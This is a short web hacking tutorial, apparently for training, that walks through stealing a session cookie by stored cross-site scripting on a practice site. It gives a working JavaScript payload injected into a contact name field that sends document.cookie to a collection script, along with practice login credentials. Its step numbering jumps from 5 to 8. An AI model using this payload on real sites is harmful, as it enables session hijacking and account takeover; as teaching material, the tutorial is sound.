How to Hack a Website
In this website hacking practical scenario, we are going to hijack the user session of the web application located at www.techpanda.org. We will use cross site scripting to read the cookie session id then use it to impersonate a legitimate user session.

The assumption made is that the attacker has access to the web application and he would like to hijack the sessions of other users that use the same application. The goal of this attack could be to gain admin access to the web application assuming the attacker’s access account is a limited one.

Step 1) Open URL http://www.techpanda.org/.

For practice purposes, it is strongly recommended to gain access using SQL Injection. Refer to this article for more information on how to do that.

Step 2) Enter Login Details.

The login email is admin@google.com, the password is Password2010.

Step 3) Check dashboard.

If you have logged in successfully, then you will get the following dashboard

Step 4) Enter New Content.

Click on Add New Contact and Enter the following as the first name

<a href=# onclick=\”document.location=\’http://techpanda.org/snatch_sess_id.php?c=\’+escape\(document.cookie\)\;\”>Dark</a>

Step 5) Add Javascript.

The above code uses JavaScript. It adds a hyperlink with an onclick event. When the unsuspecting user clicks the link, the event retrieves the PHP cookie session ID and sends it to the snatch_sess_id.php page together with the session id in the URL

Step 8) Check session id.

Since the cross site script code is stored in the database, it will be loaded everytime the users with access rights login
Let’s suppose the administrator logins and clicks on the hyperlink that says Dark
He/she will get the window with the session id showing in the URL

Note: the script could be sending the value to some remote server where the PHPSESSID is stored then the user redirected back to the website as if nothing happened.

Note: the value you get may be different from the one in this webpage hacking tutorial, but the concept is the same
